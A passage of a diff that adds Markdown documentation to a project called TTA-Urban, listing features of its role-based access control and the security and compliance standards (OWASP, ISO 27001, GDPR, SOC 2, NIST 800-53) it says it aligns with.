+9. ✅ **Extensible Architecture** - Easy to add new roles or permissions
+10. ✅ **Production-Ready** - Follows industry best practices
+
+#### Compliance & Security Standards
+
+TTA-Urban's RBAC implementation aligns with:
+
+- **OWASP Top 10** - Addresses A01:2021 Broken Access Control
+- **ISO 27001** - Access control policy requirements
+- **GDPR** - Data access restrictions and audit trails
+- **SOC 2** - Access control and monitoring requirements
+- **NIST 800-53** - Access control family (AC-1 through AC-24)
+
+---
